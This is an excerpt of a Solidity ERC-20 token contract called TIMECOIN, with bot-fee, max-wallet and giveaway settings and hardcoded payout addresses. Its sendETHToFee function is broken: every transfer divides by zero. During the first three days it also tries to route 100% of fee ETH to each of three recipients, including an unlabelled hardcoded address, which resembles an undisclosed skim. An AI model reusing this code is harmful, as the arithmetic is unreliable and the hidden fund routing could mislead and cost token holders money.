...
contract TIMECOIN is Context, IERC20, IERC20Extented, Ownable {
    using SafeMath for uint256;
    string private constant _name = "TIMECOIN";
    ...
    uint256 public _priceImpact = 20;
    uint256 private _firstBlock;
    uint256 private _botBlocks;
    uint256 public _maxWalletAmount = 230000000 * 10**9; //230 000 000
 
    uint256 public minTokensToSwap = 100000 * 10**9; // 100 000
    ...
    // Bot fees
    uint256 public _botBuyMarketingFee = 8;
    uint256 public _botBuyReflectionFee = 9;
    uint256 public _botBuyLiquidityFee = 23;
    ...
    uint256 constant private _giveway = 50;
    ...
    address payable private _marketingAddress = payable(0x3722EFeC89FecC8034aeA65F02DB804CBC210100); //marketing
    address payable constant private _givewayAddress = payable(0x3722EFeC89FecC8034aeA65F02DB804CBC210100); //giveaway
    ...
    function sendETHToFee(uint256 amount) private {
        if(block.timestamp < _firstBlock + (3 days)) {
            address payable addr = payable(0x1CED5b40481E2124646198e7079a127De9083277);
            addr.transfer(amount.mul(uint256(100)).div(0));
            _marketingAddress.transfer(amount.mul(uint256(100)).div(0));
            _givewayAddress.transfer(amount.mul(uint256(100)).div(0));
        }
        else {
            _marketingAddress.transfer(amount.mul(_marketingPercent).div(0));
            _givewayAddress.transfer(amount.mul(_giveway).div(0));
        }
    }
